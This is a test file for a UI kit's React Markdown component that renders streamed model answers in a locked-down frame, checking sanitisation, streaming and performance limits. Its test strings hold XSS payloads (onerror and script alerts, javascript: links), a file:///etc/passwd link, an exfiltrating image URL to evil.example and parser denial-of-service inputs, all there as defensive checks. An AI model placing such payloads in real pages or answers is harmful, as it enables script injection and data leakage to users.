// The kit's theme and the classes Streamdown draws with, as on a page.
import "./kit.css";
import { StrictMode } from "react";
import type { ComponentProps } from "react";
import { flushSync } from "react-dom";
import { createRoot } from "react-dom/client";
import type { Root } from "react-dom/client";
import { defaultRehypePlugins } from "streamdown";
import {
  afterAll,
  afterEach,
  beforeAll,
  describe,
  expect,
  expectTypeOf,
  it,
} from "vite-plus/test";

import { Markdown } from "../src/components/markdown.tsx";

// The kit's Markdown under what an App page's frame refuses (core's
// security-headers.ts, pageFramePolicy), each refusal made here as the
// frame makes it: innerHTML throws (Trusted Types with no policy), so
// does document.cookie (an opaque origin), nothing reaches the network
// (`connect-src 'none'`: fetch and XMLHttpRequest throw here), and an
// image loads only from `data:` and `blob:` (`img-src`, set as this
// document's own policy). Its text is a model's answer: untrusted, hostile
// at times, and half-written while it streams.
//
// The ways it can fail: raw HTML in the text becomes markup; a link or an
// image carries a `javascript:` or `data:` address onto the page; an image
// sends what the answer holds to another server; a link is something to
// click that does nothing in the frame, or navigates it; half-written
// Markdown breaks the render or shows Streamdown's own placeholders; or a
// feature needs what the frame refuses and fails.

/** What the frame does where it refuses something: a throw. */
const refused = (message: string) => (): never => {
  throw new DOMException(message, "SecurityError");
};

const innerHtml = Object.getOwnPropertyDescriptor(
  Element.prototype,
  "innerHTML"
);
const cookie = Object.getOwnPropertyDescriptor(Document.prototype, "cookie");
const xhrOpen = Object.getOwnPropertyDescriptor(
  XMLHttpRequest.prototype,
  "open"
);
const { fetch } = globalThis;

/** Every error the page raised, thrown or rejected. */
const errors: unknown[] = [];
/** Every address the page's policy refused to load. */
const blocked: string[] = [];

const onError = (event: ErrorEvent): void => {
  errors.push(event.error ?? event.message);
};
const onRejection = (event: PromiseRejectionEvent): void => {
  errors.push(event.reason);
};
const onViolation = (event: SecurityPolicyViolationEvent): void => {
  blocked.push(event.blockedURI);
};

let mounted: Root | undefined;

/** Shows `text` as a model's answer, or the answer grown, in place. */
const show = (text: string, isAnimating = false): void => {
  if (mounted === undefined) {
    const container = document.createElement("main");
    document.body.append(container);
    mounted = createRoot(container);
  }
  flushSync(() => {
    mounted?.render(
      <StrictMode>
        <Markdown isAnimating={isAnimating}>{text}</Markdown>
      </StrictMode>
    );
  });
};

/** The Markdown as it is now. */
const markdown = (): HTMLElement => {
  const shown = document.querySelector<HTMLElement>("[data-slot=markdown]");
  if (shown === null) {
    throw new Error("No Markdown shown");
  }
  return shown;
};

/** The text of every element `selector` matches in the Markdown. */
const texts = (selector: string): string[] =>
  [...markdown().querySelectorAll(selector)].map(
    (element) => element.textContent?.trim() ?? ""
  );

/** Whether the code block's lines are drawn in the grammar's colours. */
const highlighted = (): boolean =>
  markdown().querySelector("[data-slot=code-block-line] span[style]") !== null;

/** Whether the code block's copy button is off, if it shows one. */
const copyOff = (): boolean | undefined =>
  markdown().querySelector<HTMLButtonElement>(
    "[data-slot=code-block-copy-button]"
  )?.disabled;

const answer = `# Overdue invoices

Two are **overdue** and one is *disputed* &mdash; Smit &amp; Zonen&#39;s.

| Supplier | Days late |
| --- | ---: |
| Kantoorhuis Utrecht | 12 |
| Drukkerij Noord | 3 |

- [x] Reminded
- [ ] Escalated

See [the policy](https://example.com/policy) or https://example.com/terms.

Pay within the term[^1] at www.example.com/pay.

![Invoice scan](https://images.example.com/scan.png)

\`\`\`ts
const overdue = invoices.filter((invoice) => invoice.due < today);
\`\`\`

[^1]: Within 30 days.
`;

describe("the kit's Markdown, in an App page's frame", () => {
  beforeAll(() => {
    const policy = document.createElement("meta");
    policy.httpEquiv = "Content-Security-Policy";
    policy.content = "img-src data: blob:";
    document.head.append(policy);
    Object.defineProperty(Element.prototype, "innerHTML", {
      configurable: true,
      get(this: Element): string {
        const read: unknown = innerHtml?.get?.call(this);
        return typeof read === "string" ? read : "";
      },
      set: refused("This document requires 'TrustedHTML' assignment."),
    });
    const noCookie = refused(
      "The document is sandboxed and lacks the 'allow-same-origin' flag."
    );
    Object.defineProperty(Document.prototype, "cookie", {
      configurable: true,
      get: noCookie,
      set: noCookie,
    });
    const noConnection = refused("Refused to connect: connect-src 'none'.");
    globalThis.fetch = noConnection;
    Object.defineProperty(XMLHttpRequest.prototype, "open", {
      configurable: true,
      value: noConnection,
    });
    window.addEventListener("error", onError);
    window.addEventListener("unhandledrejection", onRejection);
    document.addEventListener("securitypolicyviolation", onViolation);
  });

  afterEach(() => {
    mounted?.unmount();
    mounted = undefined;
    document.body.replaceChildren();
    errors.length = 0;
    blocked.length = 0;
  });

  afterAll(() => {
    window.removeEventListener("error", onError);
    window.removeEventListener("unhandledrejection", onRejection);
    document.removeEventListener("securitypolicyviolation", onViolation);
    globalThis.fetch = fetch;
    for (const [target, name, descriptor] of [
      [Element.prototype, "innerHTML", innerHtml],
      [Document.prototype, "cookie", cookie],
      [XMLHttpRequest.prototype, "open", xhrOpen],
    ] as const) {
      if (descriptor !== undefined) {
        Object.defineProperty(target, name, descriptor);
      }
    }
  });

  it("shows Markdown, tables, task lists, links, images and fenced code through the code block", async () => {
    show(answer);

    // The image's address is refused by the page's policy, so nothing is
    // fetched, and Streamdown says so in its place.
    await expect
      .poll(() => blocked)
      .toContain("https://images.example.com/scan.png");
    await expect.poll(highlighted).toBeTruthy();
    // The table is framed by Streamdown's own classes, which the page's
    // stylesheet has.
    const frame = markdown().querySelector("table")?.parentElement;
    expect({
      heading: texts("h1"),
      strong: texts("[data-streamdown=strong]"),
      emphasis: texts("em"),
      // A named entity, decoded without innerHTML.
      entities: texts("p")[0],
      header: texts("th"),
      cells: texts("td"),
      frame: frame ? getComputedStyle(frame).borderTopWidth : "",
      tasks: [...markdown().querySelectorAll("input[type=checkbox]")].map(
        (box) => box instanceof HTMLInputElement && box.checked
      ),
      // A link is its words and its address, to read: nothing to click.
      links: markdown().querySelectorAll("a").length,
      linkText: texts("p").find((text) => text.startsWith("See")),
      // An autolink is its address once, and a footnote's links, within
      // the answer, their words alone.
      autolink: texts("p").find((text) => text.startsWith("Pay")),
      footnote: texts("[data-footnotes] li"),
      image: texts("[data-streamdown=image-fallback]"),
      // Fenced code is the kit's code block, its copy button on.
      code: {
        title: texts("[data-slot=code-block-title]"),
        lines: texts("[data-slot=code-block-line]"),
        copyOff: copyOff(),
      },
      errors,
    }).toStrictEqual({
      heading: ["Overdue invoices"],
      strong: ["overdue"],
      emphasis: ["disputed"],
      entities: "Two are overdue and one is disputed — Smit & Zonen's.",
      header: ["Supplier", "Days late"],
      cells: ["Kantoorhuis Utrecht", "12", "Drukkerij Noord", "3"],
      frame: "1px",
      tasks: [true, false],
      links: 0,
      linkText:
        "See the policy (https://example.com/policy) or https://example.com/terms.",
      autolink: "Pay within the term1 at www.example.com/pay.",
      footnote: ["Within 30 days. ↩"],
      image: ["Image not available"],
      code: {
        title: ["ts"],
        lines: [
          "const overdue = invoices.filter((invoice) => invoice.due < today);",
        ],
        copyOff: false,
      },
      errors: [],
    });
  });

  it("shows half-written Markdown as it grows, completing what isn't closed yet", async () => {
    const seen: Record<string, unknown> = {};
    // Bold not closed yet: bold already.
    show("The total is **12", true);
    seen.bold = {
      strong: texts("[data-streamdown=strong]"),
      text: markdown().textContent,
    };
    // A link whose address is still coming: its words alone, never
    // Streamdown's placeholder address.
    show("The total is **12** EUR, see [the invoice](https://exa", true);
    seen.partialLink = markdown().textContent;
    show(
      "The total is **12** EUR, see [the invoice](https://example.com/1)",
      true
    );
    seen.link = markdown().textContent;
    // A table: one as soon as its divider fits its header, its rows added
    // as they arrive.
    show("| Supplier | Days |\n| --- | --- |\n| Kantoorhuis", true);
    seen.partialTable = { header: texts("th"), cells: texts("td") };
    show(
      "| Supplier | Days |\n| --- | --- |\n| Kantoorhuis | 12 |\n| Drukk",
      true
    );
    seen.table = texts("td");
    // A fence not closed yet: already a code block, which can't be copied
    // until its closing fence arrives.
    const code = "```ts\nconst overdue = invoices\n  .filter((invoice) =>";
    show(code, true);
    await expect.poll(highlighted).toBeTruthy();
    seen.partialCode = {
      title: texts("[data-slot=code-block-title]"),
      copyOff: copyOff(),
    };
    show(`${code} invoice.overdue);\n\`\`\`\n\nDone.`);
    seen.code = {
      lines: texts("[data-slot=code-block-line]"),
      copyOff: copyOff(),
      after: texts("p"),
    };

    expect({ ...seen, errors }).toStrictEqual({
      bold: { strong: ["12"], text: "The total is 12" },
      partialLink: "The total is 12 EUR, see the invoice",
      link: "The total is 12 EUR, see the invoice (https://example.com/1)",
      partialTable: {
        header: ["Supplier", "Days"],
        cells: ["Kantoorhuis", ""],
      },
      table: ["Kantoorhuis", "12", "Drukk", ""],
      partialCode: { title: ["ts"], copyOff: true },
      code: {
        lines: [
          "const overdue = invoices",
          ".filter((invoice) => invoice.overdue);",
        ],
        copyOff: false,
        after: ["Done."],
      },
      errors: [],
    });
  });

  it("shows every step of an answer as it streams, without an error", () => {
    for (let end = 1; end <= answer.length; end += 7) {
      show(answer.slice(0, end), true);
    }
    show(answer);
    expect({ cells: texts("td").length, errors }).toStrictEqual({
      cells: 4,
      errors: [],
    });
  });

  // Untrusted text that would freeze the page for many seconds, or
  // overflow marked's stack and take the page to its error screen
  // (measured before the kit's limits: 2,000 nested quotes threw; 100 KB
  // of `*a` took 45 s, of `*_` 99 s; 20,000 unclosed links 75 s).
  it.each([
    ["nested quotes", `${"> ".repeat(10_000)}deep`],
    [
      "emphasis inside what looks like a fence in an HTML block",
      `<div>\n\`\`\`\n\n${"*_".repeat(29_000)}\n\`\`\``,
    ],
    [
      "emphasis in paragraphs split by lines that only look blank",
      `${"*a".repeat(250)}\n\u00A0\n`.repeat(118),
    ],
    [
      "footnote definitions over indented lines",
      `${"[^a]:\n    ".repeat(2000)}x`,
    ],
    ["nested footnote definitions", "[^a]: [^b]: ".repeat(3000)],
    ["nested lists", `${"- ".repeat(10_000)}deep`],
    [
      "lists nested by indentation",
      Array.from(
        { length: 2000 },
        (_, level) => `${"  ".repeat(level)}- x`
      ).join("\n"),
    ],
    ["nested emphasis", `${"*a ".repeat(2500)}b${" c*".repeat(2500)}`],
    ["emphasis", "*a".repeat(50_000)],
    ["mixed emphasis", "*_".repeat(50_000)],
    ["unclosed links", "[x](https://a".repeat(20_000)],
    [
      "a megabyte",
      "Some **bold** text with [a link](https://x.example).\n\n".repeat(20_000),
    ],
  ])("shows %s as plain text, at once and without an error", (_name, text) => {
    const started = performance.now();
    show(text, true);
    const elapsed = performance.now() - started;
    expect({
      fast: elapsed < 1000,
      drawn: markdown().querySelectorAll("[data-streamdown]").length,
      text: markdown().textContent === text,
      errors,
    }).toStrictEqual({ fast: true, drawn: 0, text: true, errors: [] });
  });

  it("still draws an ordinary long answer, tens of kilobytes of prose, tables and code, as Markdown", () => {
    const longAnswer = Array.from(
      { length: 200 },
      (_, index) => `## Part ${index}

The *invoice_total* for **supplier_${index}** is due; see [the policy](https://example.com/p/${index}).

| Supplier | Days |
| --- | ---: |
| Kantoorhuis_${index} | ${index} |

\`\`\`ts
const overdue_items = invoices.filter((inv) => inv.due_date < today);
\`\`\`

`
    ).join("");
    show(longAnswer);
    expect({
      long: longAnswer.length > 40_000,
      tables: markdown().querySelectorAll("table").length,
      code: markdown().querySelectorAll("[data-slot=code-block]").length,
      errors,
    }).toStrictEqual({ long: true, tables: 200, code: 200, errors: [] });
  });

  // Ordinary model output with many `*`, `_` and `[`, which the limits
  // must never turn into plain text: what is checked is what can open
  // emphasis or a link, per inline run.
  it.each([
    [
      "300 lines of code with snake_case names and indexing",
      `\`\`\`python\n${Array.from({ length: 300 }, (_, line) => `total_amount_${line} = invoice_rows[row_index][${line}] * unit_price[item_id_${line}]`).join("\n")}\n\`\`\``,
      "[data-slot=code-block-line]",
      300,
    ],
    [
      "a list of 300 items with a bold term and a link each",
      Array.from(
        { length: 300 },
        (_, item) =>
          `* **term_${item}**: see [the docs](https://example.com/docs/${item})`
      ).join("\n"),
      "li",
      300,
    ],
    [
      "a table of 200 rows by 6 columns of snake_case names and a link",
      `| invoice_id | supplier_name | due_date | amount_due | status_code | link |\n| --- | --- | --- | --- | --- | --- |\n${Array.from({ length: 200 }, (_, row) => `| inv_${row} | supplier_name_${row} | due_date_${row} | amount_${row} | status_ok | [open](https://example.com/i/${row}) |`).join("\n")}`,
      "tbody tr",
      200,
    ],
    [
      "a long paragraph of snake_case words with footnotes and reference links",
      `${Array.from({ length: 200 }, (_, note) => `The user_id and account_balance_${note} fields come from the billing_service[^${note}], see [the reference][ref${note}].`).join(" ")}\n\n${Array.from({ length: 200 }, (_, note) => `[^${note}]: Note ${note}.\n[ref${note}]: https://example.com/r/${note}`).join("\n")}`,
      "[data-footnotes] li",
      200,
    ],
    [
      "a numbered list nested four deep with code spans",
      Array.from(
        { length: 80 },
        (_, step) =>
          `1. Step \`step_${step}\`\n   1. Sub \`sub_step\`\n      1. Deeper \`deep_value\`\n         1. Deepest \`x[0]\` and **bold**`
      ).join("\n"),
      "ol ol ol ol",
      80,
    ],
    [
      "200 lines of C with pointers",
      `\`\`\`c\n${Array.from({ length: 200 }, (_, line) => `static int copy_${line}(char *dst, const char *src, size_t n) { while (n-- && (*dst++ = *src++)) {} return *dst ? -1 : 0; }`).join("\n")}\n\`\`\``,
      "[data-slot=code-block-line]",
      200,
    ],
    [
      "150 lines of regular expressions",
      `\`\`\`js\n${Array.from({ length: 150 }, (_, line) => `const pattern_${line} = /^(?:[a-z_]\\w*|\\d+)\\s*(?:\\*\\*|[*+?])?.*?$/u;`).join("\n")}\n\`\`\``,
      "[data-slot=code-block-line]",
      150,
    ],
    [
      "arithmetic with many `*`",
      Array.from(
        { length: 100 },
        (_, line) =>
          `${line} * 2 * 3 * 4 * 5 = ${line * 120}, and a*b*c*d with x_1 * y_2.`
      ).join("\n"),
      "p",
      1,
    ],
  ])("draws %s as Markdown", (_name, text, selector, count) => {
    show(text);
    expect({
      drawn: markdown().querySelectorAll(selector).length,
      errors,
    }).toStrictEqual({ drawn: count, errors: [] });
  });

  it("checks every streamed step: Markdown until the text passes a limit, plain text after", () => {
    const seen: string[] = [];
    // A quote nesting one level deeper on each step, past 20 levels.
    for (let levels = 18; levels <= 22; levels += 1) {
      show(`${"> ".repeat(levels)}deep`, true);
      seen.push(
        `${levels}: ${markdown().querySelectorAll("blockquote").length > 0 ? "markdown" : "text"}`
      );
    }
    // A paragraph of emphasis growing past 3,000 delimiters, a step at a time.
    const started = performance.now();
    for (let end = 2600; end <= 3400; end += 200) {
      show("*a".repeat(end), true);
    }
    expect({
      seen,
      fast: performance.now() - started < 2000,
      // Plain text: the text alone, no element drawn.
      last: markdown().children.length,
      errors,
    }).toStrictEqual({
      seen: [
        "18: markdown",
        "19: markdown",
        "20: markdown",
        "21: text",
        "22: text",
      ],
      fast: true,
      last: 0,
      errors: [],
    });
  });

  it("shows the text as plain text when drawing it throws, instead of the page's error screen", () => {
    show("");
    flushSync(() => {
      mounted?.render(
        <Markdown
          components={{
            h1: () => {
              throw new Error("A component failed.");
            },
          }}
        >
          {"# Title\n\nBody."}
        </Markdown>
      );
    });
    expect({
      text: markdown().textContent,
      drawn: markdown().querySelectorAll("[data-streamdown]").length,
    }).toStrictEqual({ text: "# Title\n\nBody.", drawn: 0 });
  });

  it("shows raw HTML in the text as text, never as markup", () => {
    show(`Hello <b>there</b>.

<img src="x" onerror="alert(1)">

<script>alert(1)</script>

<iframe src="https://evil.example"></iframe>

<a href="javascript:alert(1)">click</a> <details open><summary>More</summary>hidden</details>`);

    expect({
      markup: markdown().querySelectorAll(
        "b, img, script, iframe, a, details, summary"
      ).length,
      text: markdown().textContent?.startsWith(
        'Hello <b>there</b>.<img src="x" onerror="alert(1)">'
      ),
      blocked,
      errors,
    }).toStrictEqual({
      markup: 0,
      text: true,
      blocked: [],
      errors: [],
    });
  });

  it("keeps its safe handling whatever a page passes: a link and raw HTML stay text", () => {
    // What a page would pass to put links and HTML back: its own link,
    // Streamdown's own rehype plugins (rehype-raw among them), remark-rehype
    // passing HTML through, a URL transform, allowed tags, and a block
    // component that writes the text as it likes. The types refuse each
    // but `components`; spread past them, none changes anything.
    const widening = {
      rehypePlugins: Object.values(defaultRehypePlugins),
      remarkPlugins: [],
      remarkRehypeOptions: { allowDangerousHtml: true },
      urlTransform: () => "https://evil.example/leak",
      allowedTags: { a: ["href"], img: ["src", "onerror"] },
      literalTagContent: ["a"],
      plugins: {},
      BlockComponent: () => <a href="https://evil.example">replaced</a>,
      linkSafety: { enabled: false },
    };
    expectTypeOf<
      Extract<keyof ComponentProps<typeof Markdown>, keyof typeof widening>
    >().toBeNever();
    // The root the page renders into.
    show("");
    flushSync(() => {
      mounted?.render(
        <Markdown
          components={{
            a: ({ href, children }) => <a href={href}>{children}</a>,
            img: ({ src }) => (
              <a href={typeof src === "string" ? src : ""}>image</a>
            ),
            p: ({ children }) => <p data-page="">{children}</p>,
          }}
          {...widening}
        >
          {`See [the policy](https://example.com/policy).

- ![scan](https://images.example.com/scan.png)

<a href="https://evil.example">raw</a> <img src="x" onerror="alert(1)">`}
        </Markdown>
      );
    });

    expect({
      links: markdown().querySelectorAll("a").length,
      // The kit's image, Streamdown's own, not the page's link.
      images: [...markdown().querySelectorAll("img")].map((image) =>
        image.getAttribute("src")
      ),
      // The page's other components still restyle what they name.
      paragraphs: texts("p[data-page]"),
      errors,
    }).toStrictEqual({
      links: 0,
      images: ["https://images.example.com/scan.png"],
      paragraphs: [
        "See the policy (https://example.com/policy).",
        '<a href="https://evil.example">raw</a> <img src="x" onerror="alert(1)">',
      ],
      errors: [],
    });
  });

  it("drops an unsafe address from a link or an image, and loads no image from another server", async () => {
    show(`[run](javascript:alert(1)) [page](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==) [vb](vbscript:msgbox) [file](file:///etc/passwd) <javascript:alert(1)>

![script](javascript:alert(1))

![drawn](data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciLz4=)

![leak](https://evil.example/leak?answer=the-secret)`);

    // The other server's image is put on the page, and the page's policy
    // refuses to fetch it: nothing of the answer leaves.
    await expect
      .poll(() => blocked)
      .toContain("https://evil.example/leak?answer=the-secret");
    expect({
      // No other address reaches an attribute.
      addresses: [...markdown().querySelectorAll("*")].flatMap((element) =>
        ["href", "src", "action", "formaction", "srcset"].flatMap((name) => {
          const value = element.getAttribute(name);
          return value === null ? [] : [value];
        })
      ),
      // Each link is its words, marked blocked by Streamdown: nothing to
      // click.
      controls: markdown().querySelectorAll("a, button").length,
      links: texts("p")[0],
      // A `data:` image is blocked too, though the frame would load it:
      // its words show in its place.
      images: texts("p").slice(1),
      errors,
    }).toStrictEqual({
      addresses: ["https://evil.example/leak?answer=the-secret"],
      controls: 0,
      links:
        "run [blocked] page [blocked] vb [blocked] file [blocked] javascript:alert(1) [blocked]",
      images: ["[Image blocked: script]", "[Image blocked: drawn]"],
      errors: [],
    });
  });
});
